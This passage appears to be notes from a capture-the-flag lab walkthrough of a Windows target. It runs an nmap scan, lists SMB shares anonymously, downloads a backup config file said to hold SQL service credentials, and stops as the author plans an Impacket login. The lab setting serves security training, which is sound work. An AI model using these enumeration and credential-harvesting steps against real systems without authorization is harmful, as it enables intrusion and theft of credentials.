Terminal 1:
$ sudo openvpn 
.
.
.
Terminal 2:
$ nmap -sC -sV -p$ports 10.10.10.27
.
.
.
Nmap scan report for 10.10.10.27
Host is up (0.028s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server  14.00.1000.00
.
.
.
// Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.
.
// It is worth checking to see if anonymous access has been permitted, as file shares often store configuration files 
// containing passwords or other sensitive information. We can use smbclient to list available shares.
.
$ smbclient -N -L \\\\10.10.10.27\\ 
Unable to initialize messaging context

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        
// It seems there is a share called backups. Let's attempt to access it and see what's inside.
.
$ smbclient -N \\\\10.10.10.27\\backups
Unable to initialize messaging context
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8254961 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)
smb: \> 
.
// There is a dtsConfig file, which is a config file used with SSIS.
.
// We see that it contains a SQL connection string, containing credentials for the local Windows user ARCHETYPE\sql_svc.
.
// Let's try connecting to the SQL Server using Impacket's mssqlserver.py.
